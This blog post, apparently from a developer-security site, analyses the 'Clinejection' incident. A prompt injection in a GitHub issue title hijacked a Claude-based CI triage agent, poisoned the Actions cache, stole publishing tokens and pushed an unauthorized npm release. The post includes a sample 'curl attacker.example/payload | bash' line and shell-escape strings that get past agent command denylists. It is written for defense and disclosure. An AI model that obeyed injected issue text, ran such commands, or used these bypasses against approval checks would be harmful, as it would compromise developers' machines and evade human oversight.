@@ -1,0 +1,106 @@
+---
+title: "Beware: Clinejection — How a GitHub Issue Title Became a Supply Chain Attack on Millions of Developers"
+description: "A prompt injection in a GitHub issue title compromised Cline's CI/CD pipeline, poisoned the Actions cache, stole npm publication tokens, and published a malicious package to millions of auto-updating developers. This is the first documented supply chain attack exploiting an AI coding agent's own workflow."
+pubDate: "2026-07-20T16:00:00Z"
+updatedDate: "2026-07-20T16:00:00Z"
+tags: ["security", "beware", "supply-chain", "prompt-injection", "github-actions", "cline", "ci-cd", "coding-agents"]
+tool: "industry"
+author: "kira"
+image: "/api/og?title=Beware:%20Clinejection%20Supply%20Chain%20Attack&tool=industry"
+---
+
+On February 17, 2026, an unknown actor published `cline@2.3.0` to npm. The package installed `openclaw@latest` globally on every developer machine that auto-updated during an eight-hour window. The CLI binary itself was untouched — byte-identical to the legitimate 2.2.3 release. The only change was a `postinstall` script. Cline has over five million installs. That is the punchline. Now the setup.
+
+The attack, dubbed **Clinejection** by security researcher Adnan Khan, is the first documented case of a supply chain compromise exploiting an AI coding agent's own CI/CD workflow. It chains four well-understood vulnerability classes — prompt injection, cross-fork object references, GitHub Actions cache poisoning, and credential model weakness — into a single exploit that requires nothing more than opening a GitHub issue. No repository access. No pull request approval. No social engineering beyond choosing a good title.
+
+If you run any AI-powered GitHub Actions workflow that reads untrusted input, this is the incident that tells you your blast radius is larger than you think.
+
+## How Cline set the stage
+
+On December 21, 2025, Cline's maintainers added a GitHub Actions workflow called `claude-issue-triage.yml` to automatically process incoming bug reports. The workflow used Anthropic's `claude-code-action` to route GitHub events through a Claude agent. The configuration gave Claude broad tool access:
+
+- `--allowedTools "Bash,Read,Write,Edit,Glob,Grep,WebFetch,WebSearch"`
+- `allowed_non_write_users: "*"` — meaning anyone with a GitHub account could trigger it
+
+The issue title was interpolated directly into Claude's prompt via `${{ github.event.issue.title }}` without sanitization, escaping, or any delimiter. That is a textbook indirect prompt injection surface. The kind SQL injection was before parameterized queries became standard.
+
+## The attack chain
+
+Khan's research demonstrates a five-phase attack that turns a single GitHub issue into a production compromise:
+
+**Phase 1: Prompt injection.** An attacker opens an issue whose title contains natural-language instructions directed at the AI agent. In Khan's proof of concept, the title instructed Claude to install a prerequisite package before running diagnostics. Because the title was interpolated directly into the system prompt, Claude interpreted the attacker's text as legitimate instructions.
+
+**Phase 2: Malicious package via cross-fork object reference (CFOR).** The injected instructions told Claude to run `npm install github:cline/cline#<commit-sha>`. The referenced commit existed in a fork the attacker created, pushed a malicious `package.json` with a `preinstall` script, then deleted. GitHub's shared object store retains commit objects even after a fork is deleted — the commit remained accessible through the parent repository's namespace. Claude "happily executed the payload in all test attempts."
+
+**Phase 3: Cache poisoning via Cacheract.** The malicious `preinstall` script fetched and executed a remote shell script that deployed Cacheract, a proof-of-concept cache poisoning tool Khan authored as part of his research. Cacheract floods the Actions cache with over 10 GB of junk data, triggering GitHub's LRU eviction policy to purge legitimate entries. It then re-registers those evicted cache keys with poisoned entries — all within minutes, from a single workflow run. The attack persists by hijacking the `actions/checkout` post step.
+
+**Phase 4: Credential exfiltration.** The triage workflow that triggered the initial attack had restricted permissions and no access to publication secrets. But it shared cache scope with the nightly release workflow. When the nightly publish job ran at approximately 2 AM UTC, it restored the poisoned `node_modules` cache. Cacheract detonated, exfiltrating three publication secrets to an external callback host: `VSCE_PAT` (VS Code Marketplace), `OVSX_PAT` (OpenVSX), and `NPM_RELEASE_TOKEN` (npm).
+
+**Phase 5: Credential isolation failure.** Cline's publication tokens were scoped to the publisher identity, not per-extension or per-environment. Nightly release credentials could authorize production releases. The npm token applied across the entire `cline` package namespace. The stolen token had the same access as a production publication credential.
+
+## The timeline of ignored warnings
+
+This is where the story turns from technical to organizational.
+
+| Date | Event |
+|------|-------|
+| Dec 21, 2025 | Vulnerable triage workflow deployed |
+| Jan 1, 2026 | Khan submits GHSA advisory and emails security@cline.bot |
+| Jan 8 | Follow-up email — ignored |
+| Jan 18 | X/Twitter DM attempt — ignored |
+| Jan 28 | Unknown actor ("glthub-actions") begins testing injection on the real repository |
+| Jan 31 – Feb 3 | Suspicious cache failures observed in Cline's nightly workflows |
+| Feb 7 | Khan's final email — ignored |
+| Feb 9 | Public disclosure; Cline fixes within 30 minutes |
+| Feb 10 | Cline confirms receipt, states credentials rotated |
+| Feb 11 | Cline re-rotates after report that tokens may still be valid |
+| Feb 17, 3:26 AM PT | Unauthorized `cline@2.3.0` published to npm |
+| Feb 17, 11:23 AM PT | Cline publishes 2.4.0, deprecates 2.3.0 |
+
+Khan disclosed privately 47 days before going public. The fix took 30 minutes after publication. The credential rotation was incomplete — the wrong npm token was deleted on February 9, leaving the exfiltrated one active for eight more days. When the unauthorized package was finally published, it had been live for approximately eight hours before deprecation.
+
+The unauthorized `cline@2.3.0` contained a benign payload — `npm install -g openclaw@latest` — consistent with a security research demonstration rather than a destructive campaign. But the mechanism does not care about the payload. A `postinstall` script that runs `curl attacker.example/payload | bash` instead of `npm install openclaw@latest` would execute on every machine that auto-updated during that window.
+
+## Why this matters beyond Cline
+
+Khan's research, independently validated by Snyk and the Cloud Security Alliance, identifies a structural vulnerability class that extends well beyond one project. Aikido Security named it **PromptPwnd** and confirmed the same pattern across at least five Fortune 500 companies and Google's `gemini-cli` repository (which was patched within four days of responsible disclosure).
+
+The pattern is simple: any AI-powered CI/CD workflow that interpolates unsanitized user-controlled content — issue titles, PR bodies, commit messages — into an agent's prompt is vulnerable. Any such workflow granted `Bash`, `Write`, or `Edit` tool access provides the code execution needed for exploitation. Any workflow that shares cache scope with a higher-privilege workflow enables lateral movement.
+
+Clinejection demonstrated that the separation between "repository contributor" and "workflow execution," between "low-privilege CI job" and "high-privilege publishing credentials," and between "artifact integrity of one workflow and another" are all illusions when an AI agent sits in the middle with broad tool access and unsanitized input.
+
+## The secondary attack surface: your own agent's approval system
+
+The Clinejection story intersects with a broader pattern visible across the coding agent ecosystem this year. Multiple agents have shipped approval and permission systems that silently fail under real-world conditions:
+
+- **Claude Code** had a bash permission bypass via shell command chaining (issue #4956, CVE-2025-66032 for the `$IFS` variant), where prefix-matching rules for `Bash(safe-cmd:*)` were defeated by `&&`, `;`, `|`, and dozens of other shell operators.
+- **Hermes Agent** had a regex-based dangerous-command denylist bypassable by shell escape sequences (`r\m -rf`, `$(echo rm) -rf`, `${0/x/r}m -rf`), where the `tui_gateway` shell.exec path inherited the same bypassable gate (issue #36847) and had a secondary fail-open path when the approval module import failed.
+- **Cursor** shipped multiple CVEs (CVE-2025-54130, CVE-2025-61590) for arbitrary code execution via prompt injection through `.vscode/settings.json` and `.code-workspace` files that could be written without user approval.
+
+The common thread: approval systems built on regex denylists, prefix matching, or fail-open defaults break the moment an attacker applies basic shell knowledge. The approval layer is the security boundary. If it falls, everything behind it does too.
+
+## What to do today
+
+If you run any AI-powered GitHub Actions or CI/CD workflow, here is the minimal audit:
+
+1. **Audit input sanitization.** Search your workflows for `github.event.issue.title`, `github.event.issue.body`, `github.event.pull_request.title`, `github.event.pull_request.body`, and `github.event.head_commit.message`. If any of these are interpolated into an AI agent prompt without sanitization, you have a prompt injection surface.
+
+2. **Restrict `allowed_non_write_users`.** The wildcard `"*"` means any GitHub user can trigger your AI workflow. Restrict to collaborators with at minimum `read` permissions. Better: only allow maintainers.
+
+3. **Remove shell and filesystem access unless required.** Any AI workflow granted `Bash`, `Write`, or `Edit` tool access provides code execution. If the workflow only needs to read and label, remove those tools from the allowlist.
+
+4. **Separate cache scopes.** Workflows with different privilege levels should not share Actions cache scope. If your triage workflow runs in the same repository as your publish workflow, the cache is a lateral movement path.
+
+5. **Rotate credentials thoroughly.** When rotating secrets after a breach, verify that every token has actually been revoked. Cline's incomplete rotation — deleting the wrong npm token — is the reason the February 17 exploit was possible at all. Consider short-lived credentials (OIDC provenance for npm) to reduce exposure.
+
+6. **Enable OIDC for package publication.** Cline moved to OIDC provenance after the incident. This eliminates long-lived static tokens as an attack surface. If your publish workflow still uses static PATs, you are one cache-poisoning incident away from a compromised release.
+
+7. **Monitor your agent's approval system.** If your coding agent uses regex-based denylists for command approval, test them with shell escape sequences. The patterns that bypass `detect_dangerous_command` in Hermes — `r\m -rf`, `$(echo rm) -rf` — work against any regex that does not perform proper shell tokenization.
+
+## The throughline
+
+Clinejection is not a bug in Cline. It is a bug in how the entire industry deploys AI agents: broad tool access, unsanitized input, shared trust boundaries, and approval systems that fail open. The researcher who found it tried to tell Cline for 47 days. The fix took 30 minutes after publication. The credential rotation was botched. The unauthorized package was live for eight hours.
+
+Every one of those failures is organizational, not technical. The vulnerability classes — prompt injection, cache poisoning, credential scope — have been known for years. What is new is that an AI agent is now the mechanism that composes them into a weapon. An agent with `Bash` access reading an unsanitized issue title is the same vulnerability class as a web application concatenating user input into a SQL query. We fixed that in web frameworks twenty years ago. The CI/CD ecosystem has not caught up.
+
+The good news: the defenses are straightforward. Sanitize input. Scope credentials. Separate cache. Fail closed. The bad news: Clinejection proves that straightforward fixes do not ship themselves, and the window between disclosure and exploitation is now measured in days, not months.
